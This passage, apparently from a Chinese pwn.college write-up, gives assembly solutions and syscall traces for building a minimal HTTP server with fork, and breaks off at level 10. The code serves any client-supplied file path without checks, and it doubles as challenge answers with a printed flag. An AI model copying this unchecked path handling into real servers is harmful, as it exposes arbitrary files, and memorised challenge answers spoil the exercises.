<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">  [ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">  [ ] open(<span class="string">"&lt;open_path&gt;"</span>, O_RDONLY) = <span class="number">5</span></span><br><span class="line">  [ ] read(<span class="number">5</span>, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">5</span>) = <span class="number">0</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：<code>open</code>函数需要文件名，这里应该是从客户端发送的数据中获取，包含在<code>read</code>读到缓冲区的内容中，下面是<code>int open(const char *filename, int flag)</code>中<code>flag</code>的具体整数值</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDONLY	00000000  <span class="comment">// 注意这里是8进制</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_WRONLY	00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDWR		00000002</span></span><br></pre></td></tr></tbody></table></figure>
<p>这题的难点在于如何获取文件路径，根据GET请求得知，文件路径从第四个字节开始，且该题的文件路径长度为16。下面是完整代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度，read的返回值就是文件内容大小</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length: # 用于存放数据长度</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure>
<p>运行上述代码得到flag，并得到相关回显：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br><span class="line">[✓] listen(3, 0)                            = 0</span><br><span class="line">[✓] accept(3, NULL, NULL)                   = 4</span><br><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY)      = 5</span><br><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br><span class="line">[✓] close(5)                                = 0</span><br><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br><span class="line">[✓] close(4)                                = 0</span><br><span class="line">[✓] exit(0)           </span><br></pre></td></tr></tbody></table></figure>
<p>下面是对这个流程的详细解释：</p>
<ol type="1">
<li><strong>创建套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>创建一个用于 IPv4（AF_INET）和
TCP（SOCK_STREAM）的套接字。<code>socket()</code> 返回的文件描述符为
<code>3</code>。</li>
</ul></li>
<li><strong>绑定套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>将套接字绑定到本地地址 <code>0.0.0.0</code> 和端口
<code>80</code>，使其能够接收来自任何 IP 地址的连接。</li>
</ul></li>
<li><strong>监听连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] listen(3, 0) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>使套接字开始监听传入的连接。这里的 <code>backlog</code> 参数为
<code>0</code>，可能意味着默认的待处理连接队列长度。</li>
</ul></li>
<li><strong>接受连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] accept(3, NULL, NULL) = 4</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>接受一个传入的连接。新的套接字文件描述符为
<code>4</code>，用于与客户端进行通信。</li>
</ul></li>
<li><strong>读取客户端请求</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>从客户端套接字 <code>4</code> 读取 HTTP 请求，读取的请求长度为
<code>161</code> 字节。</li>
</ul></li>
<li><strong>打开请求的文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY) = 5</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>根据客户端的请求路径
<code>/tmp/tmpis83a2pt</code>，打开对应的文件，文件描述符为
<code>5</code>。</li>
</ul></li>
<li><strong>读取文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>从文件描述符 <code>5</code> 中读取 <code>144</code>
字节的数据。</li>
</ul></li>
<li><strong>关闭文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(5) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>关闭文件描述符 <code>5</code>。</li>
</ul></li>
<li><strong>发送响应头</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>向客户端发送 HTTP 响应头，表明请求成功（200 OK），总共发送了
<code>19</code> 字节。</li>
</ul></li>
<li><strong>发送文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>将读取到的 <code>144</code> 字节的文件内容写入客户端套接字
<code>4</code>。</li>
</ul></li>
<li><strong>关闭客户端连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(4) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>关闭客户端套接字 <code>4</code>。</li>
</ul></li>
<li><strong>退出程序</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] exit(0)</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>退出服务器程序，状态码为 <code>0</code> 表示正常退出。</li>
</ul></li>
</ol></li>
<li><p>level8：动态响应多个HTTP请求</p>
<p>wp：没什么头绪，以为要使用<code>fork</code>函数，但是参考网上的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，直接在<code>exit</code>前再加个<code>accept</code>函数即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：多个程序动态响应多个HTTP请求（GET）。题目要求分为父进程和子进程</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_RDONLY) = 3</span><br><span class="line">[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>wp：通过<code>fork</code>函数的返回值判断是父进程还是子进程</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：多个程序动态响应多个HTTP请求（POST）。题目要求如下：</p>
